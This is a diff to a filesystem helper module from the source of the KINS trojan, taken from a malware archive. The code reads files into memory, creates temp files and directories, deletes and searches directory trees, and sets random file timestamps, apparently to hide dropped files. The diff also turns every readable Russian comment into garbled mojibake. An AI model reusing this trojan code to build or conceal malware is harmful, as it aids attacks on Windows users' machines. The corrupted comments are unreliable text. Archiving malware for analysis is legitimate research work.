@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <aclapi.h>
 #include <shlwapi.h>
@@ -86,7 +97,7 @@ bool Fs::_fileToMem(LPWSTR fileName, MEMFILE *mem, DWORD flags)
         DWORD readed;
         if(CWA(kernel32, ReadFile)(mem->file, mem->data, mem->size, &readed, NULL) != FALSE && readed == mem->size)
         {
-          //FIXME: Менять протекцию на ReadOnly?
+          //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ReadOnly?
           return true;
         }
         CWA(kernel32, VirtualFree)(mem->data, 0, MEM_RELEASE);
@@ -158,7 +169,7 @@ bool Fs::_removeFile(LPWSTR file)
 bool Fs::_createTempFile(const LPWSTR prefix, LPWSTR buffer)
 {
   WCHAR path[MAX_PATH];
-  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*требование GetTempFileName*/, path);
+  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetTempFileName*/, path);
   
   if(i > 0 && i <= MAX_PATH - 14)
   {
@@ -171,7 +182,7 @@ bool Fs::_createTempFile(const LPWSTR prefix, LPWSTR buffer)
 bool Fs::_createTempFileEx(const LPWSTR prefix, const LPWSTR extension, LPWSTR buffer)
 {
   WCHAR path[MAX_PATH];
-  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*требование GetTempFileName*/, path);
+  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetTempFileName*/, path);
 
   if(i > 0 && i <= MAX_PATH - 14)
   {
@@ -191,7 +202,7 @@ bool Fs::_createTempFileEx(const LPWSTR prefix, const LPWSTR extension, LPWSTR b
 bool Fs::_createTempDirectory(const LPWSTR prefix, LPWSTR buffer)
 {
   WCHAR path[MAX_PATH];
-  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*требование GetTempFileName*/, path);
+  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetTempFileName*/, path);
 
   if(i > 0 && i <= MAX_PATH - 14)
   {
@@ -314,14 +325,14 @@ bool Fs::_setRandomFileTime(DWORD startTime, DWORD reservedSeconds, LPWSTR fileN
 {
   register DWORD currentTime = Time::_getTime();
 
-  //Проверяем ошибки времени.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(currentTime <= reservedSeconds || currentTime < startTime || (currentTime -= reservedSeconds) < startTime)return false;
 
-  //Генерируем время.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   currentTime = startTime + Crypt::mtRandRange(0, currentTime - startTime);
-  if(currentTime < startTime)return false; /*параноя*/
+  if(currentTime < startTime)return false; /*пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 
-  //Выставляем время.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   {
     bool ok = true;
     WCHAR path[MAX_PATH];
@@ -364,7 +375,7 @@ bool Fs::_createDirectoryTree(LPWSTR path, LPSECURITY_ATTRIBUTES securityAttribu
   bool r = false;
   LPWSTR p = CWA(shlwapi, PathSkipRootW)(path);
 
-  //Непонятно, может ли оно вернуть NULL. Помня фокус индусов с wsprintf, защитимся от этого.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ NULL. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ wsprintf, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   if(p == NULL)p = path; 
 
   for(;; p++)if(*p == '\\' || *p == '/' || *p == 0)
@@ -374,15 +385,15 @@ bool Fs::_createDirectoryTree(LPWSTR path, LPSECURITY_ATTRIBUTES securityAttribu
 
     DWORD attr = CWA(kernel32, GetFileAttributesW)(path);
     
-    //Не существует.
+    //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(attr == INVALID_FILE_ATTRIBUTES)
     {
       if(CWA(kernel32, CreateDirectoryW)(path, securityAttributes) == FALSE)break;
     }
-    //Это не директория.
+    //пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     else if((attr & FILE_ATTRIBUTE_DIRECTORY) == 0)break;
 
-    //Если добрались до конца, то успешный выход.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(cold == 0){r = true; break;}
 
     *p = cold;
@@ -400,9 +411,9 @@ bool Fs::_removeDirectoryTree(LPWSTR path)
   {
     do if(!_isDotsName(wfd.cFileName) && _pathCombine(curPath, path, wfd.cFileName))
     {
-      //Подпапка.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)_removeDirectoryTree(curPath);
-      //Файл
+      //пїЅпїЅпїЅпїЅ
       else _removeFile(curPath);
     }
     while(CWA(kernel32, FindNextFileW)(handle, &wfd) != FALSE);
@@ -427,7 +438,7 @@ void Fs::_findFiles(LPWSTR path, const LPWSTR *fileMasks, DWORD fileMasksCount, 
       
       if(!_isDotsName(wfd.cFileName))
       {
-        //Сравнение.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && flags & FFFLAG_SEARCH_FOLDERS) ||
           (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && flags & FFFLAG_SEARCH_FILES))
         {
@@ -439,7 +450,7 @@ void Fs::_findFiles(LPWSTR path, const LPWSTR *fileMasks, DWORD fileMasksCount, 
           }
         }
       
-        //Вход в подпапку.
+        //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && flags & FFFLAG_RECURSIVE)
         {
           if(_pathCombine(curPath, path, wfd.cFileName))
